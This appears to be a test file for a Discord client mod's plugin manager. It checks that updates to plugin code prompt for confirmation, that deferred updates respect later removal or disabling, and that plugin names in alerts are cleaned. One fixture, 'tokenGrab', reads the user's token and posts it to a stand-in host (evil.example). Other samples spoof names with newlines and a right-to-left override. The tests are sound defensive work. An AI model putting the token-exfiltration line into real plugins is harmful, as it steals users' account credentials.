// A Vendetta plugin's new code: fetched by hand (Refetch, Clear data) it's asked about like an update the app offers, and
// an update kept for later is applied to the plugin as it is then, not as it was when the update came
import { createHash } from "crypto";
import { beforeEach, describe, expect, mock, test } from "bun:test";

import { SRC } from "./src";

mock.module(SRC + "core/i18n/index.ts", () => ({
    t: (s: string, values?: Record<string, unknown>) => s.replace(/\{(\w+)\}/g, (_, k) => String(values?.[k] ?? `{${k}}`)),
    tx: (s: string) => s,
}));
/** Every alert shown, answered as [answer] says */
const alerts: any[] = [];
let answer = false;
mock.module(SRC + "core/vendetta/alerts.ts", () => ({
    showConfirmationAlert: (options: any) => {
        alerts.push(options);
        queueMicrotask(() => answer ? options.onConfirm?.() : options.onCancel?.());
    },
}));
mock.module(SRC + "core/vendetta/storage.ts", () => ({
    awaitStorage: async () => { },
    createMMKVBackend: () => ({}),
    createStorage: async () => ({}),
    purgeStorage: () => { },
    wrapSync: () => ({}),
}));
mock.module(SRC + "lib/api/settings.ts", () => ({ settings: {} }));
mock.module(SRC + "lib/utils/index.ts", () => ({ safeFetch: async () => { throw new Error("no network in tests"); } }));
mock.module(SRC + "lib/utils/addonUrl.ts", () => ({ requireAddonResponse: (r: unknown) => r, requireAddonUrl: (u: string) => u }));
mock.module(SRC + "lib/utils/safeFetch.ts", () => ({
    MAX_SIZES: { code: 1 << 20 },
    readJson: async (r: any) => r.json(),
    readText: async (r: any) => r.text(),
}));
const quiet = { log: () => { }, warn: () => { }, error: () => { } };
mock.module(SRC + "lib/utils/logger.ts", () => ({ logger: quiet, createLogger: () => quiet }));
mock.module(SRC + "plugins/crypto.ts", () => ({ sha256Hex: (text: string) => createHash("sha256").update(text).digest("hex") }));
const staged = new Map<string, any>();
mock.module(SRC + "core/addonUpdates.ts", () => ({ stagePluginUpdate: (id: string, update: any) => void staged.set(id, update) }));

(globalThis as any).window = { vendetta: {} };
// What the build defines (scripts/build.mjs)
(globalThis as any).__BUILDS_BRANCH__ = "builds-next";
const { VdPluginManager } = await import(SRC + "core/vendetta/plugins.ts");
const { plainName } = await import(SRC + "core/pluginScan.ts");

const ID = "https://plugins.example/thing/";
const plain = "export default { onLoad() { console.log('hi') } }";
const tokenGrab = "export default { onLoad() { const t = findByProps('getToken').getToken(); fetch('https://evil.example', { body: t }) } }";
/** What the plugin's link serves now */
let served = plain;
VdPluginManager.pluginFetch = async (url: string) => url.endsWith("manifest.json")
    ? new Response(JSON.stringify({ name: "Thing", description: "", authors: [], main: "index.js", hash: createHash("sha256").update(served).digest("hex") }))
    : new Response(served);

beforeEach(() => {
    for (const id of Object.keys(VdPluginManager.plugins)) delete VdPluginManager.plugins[id];
    alerts.length = 0;
    staged.clear();
    served = plain;
});

async function installed(enabled: boolean) {
    await VdPluginManager.fetchPlugin(ID);
    VdPluginManager.plugins[ID].enabled = enabled;
}

describe("new code fetched by hand", () => {
    test("that starts reading the token is asked about, and stays out when that's declined", async () => {
        await installed(true);
        served = tokenGrab;
        answer = false;
        await expect(VdPluginManager.fetchPlugin(ID, { ask: true })).rejects.toThrow("The update wasn't applied");
        expect(alerts.length).toBe(1);
        expect(VdPluginManager.plugins[ID].js).toBe(plain);
    });

    test("goes in once it's accepted", async () => {
        await installed(true);
        served = tokenGrab;
        answer = true;
        await VdPluginManager.fetchPlugin(ID, { ask: true });
        expect(VdPluginManager.plugins[ID].js).toBe(tokenGrab);
    });

    test("that does nothing new goes in without a question", async () => {
        await installed(true);
        served = `${plain}\n// a comment`;
        await VdPluginManager.fetchPlugin(ID, { ask: true });
        expect(alerts.length).toBe(0);
        expect(VdPluginManager.plugins[ID].js).toBe(served);
    });
});

describe("an update kept for later", () => {
    test("isn't applied to a plugin removed meanwhile", async () => {
        await installed(true);
        served = `${plain}\n// v2`;
        await VdPluginManager.fetchPlugin(ID, { stage: true });
        expect(staged.has(ID)).toBe(true);
        delete VdPluginManager.plugins[ID];
        await staged.get(ID).apply();
        expect(VdPluginManager.plugins[ID]).toBeUndefined();
    });

    test("leaves a plugin turned off meanwhile off", async () => {
        await installed(true);
        served = `${plain}\n// v2`;
        await VdPluginManager.fetchPlugin(ID, { stage: true });
        VdPluginManager.plugins[ID].enabled = false;
        await staged.get(ID).apply();
        expect(VdPluginManager.plugins[ID].js).toBe(served);
        expect(VdPluginManager.plugins[ID].enabled).toBe(false);
    });
});

describe("a plugin's name in an alert", () => {
    test("is one short line without control or direction characters", () => {
        expect(plainName(`Nice${"\n".repeat(300)}No risks found.`)).toBe("Nice No risks found.");
        expect(plainName("Evil‮gnp.exe")).toBe("Evil gnp.exe");
        expect([...plainName("x".repeat(500))].length).toBe(60);
        expect(plainName("")).toBe("?");
        expect(plainName(undefined)).toBe("?");
    });
});
